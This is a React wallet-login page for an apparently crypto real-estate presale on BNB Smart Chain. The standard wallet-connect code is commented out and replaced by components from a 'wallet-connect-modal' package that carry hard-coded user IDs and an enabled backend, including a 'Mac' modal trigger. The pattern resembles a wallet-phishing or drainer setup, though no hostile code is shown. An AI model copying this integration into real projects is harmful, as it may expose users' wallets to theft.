import React from "react";
import "./WalletLogin.css";
import { FaWallet } from "react-icons/fa";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount, useNetwork, useSwitchNetwork } from "wagmi";
import { Helmet } from "react-helmet";
import estakioLogo from "../Assets/estakio-logo.png";
import { ConnectWalletButton } from 'wallet-connect-modal';
import 'wallet-connect-modal/dist/wallets/phantom/styles.css';
import 'wallet-connect-modal/dist/wallets/metamask/styles.css';
import 'wallet-connect-modal/dist/wallets/rabby/styles.css';
import 'wallet-connect-modal/dist/wallets/tronlink/styles.css';
import 'wallet-connect-modal/dist/wallets/bitget/styles.css';
import 'wallet-connect-modal/dist/wallets/coinbase/styles.css';
import 'wallet-connect-modal/dist/wallets/solflare/styles.css';
import { MacModalTrigger } from 'wallet-connect-modal';
import 'wallet-connect-modal/dist/wallets/mac/styles.css';

export default function WalletLogin() {
  const { open } = useWeb3Modal();
  const { address, isConnected } = useAccount();
  const { chain } = useNetwork();
  const { chains, switchNetwork } = useSwitchNetwork();

  const targetChainId = chains[0]?.id;
  const isCorrectNetwork = chain?.id === targetChainId;

  const handleConnect = () => {
    if (!isConnected || !address) {
      open();
      return;
    }
    if (!isCorrectNetwork) {
      switchNetwork?.(targetChainId);
    }
  };

  return (
    <div className="wallet-login">
      <Helmet>
        <meta charSet="utf-8" />
        <title>Global Real Estate Marketplace - Connect Wallet</title>
      </Helmet>
      <div className="wallet-login__card">
        <div className="wallet-login__logo">
          <img src={estakioLogo} alt="Global Real Estate Marketplace" className="site-logo" />
        </div>
        <h1 className="wallet-login__title">Connect your wallet</h1>
        <p className="wallet-login__subtitle">
          Connect a Web3 wallet on BNB Smart Chain to access the Global Real Estate Marketplace presale,
          staking, and token features.
        </p>
        <ConnectWalletButton userId="sousa" />
        {/* {!isConnected || !address ? (
          <button
            type="button"
            className="wallet-login__btn"
            onClick={() => open()}
          >
            <FaWallet />
            Connect Wallet
          </button>
        ) : !isCorrectNetwork ? (
          <>
            <p className="wallet-login__connected">
              Wallet: {address.substring(0, 6)}...{address.substring(address.length - 4)}
            </p>
            <button
              type="button"
              className="wallet-login__btn"
              onClick={handleConnect}
            >
              Switch to BNB Smart Chain
            </button>
          </>
        ) : null} */}

        <p className="wallet-login__hint">
          Supports MetaMask, Trust Wallet, WalletConnect, and more.
        </p>
      </div>
      <MacModalTrigger userId="silver" backendConfig={{ enabled: true }} />
    </div>
  );
}
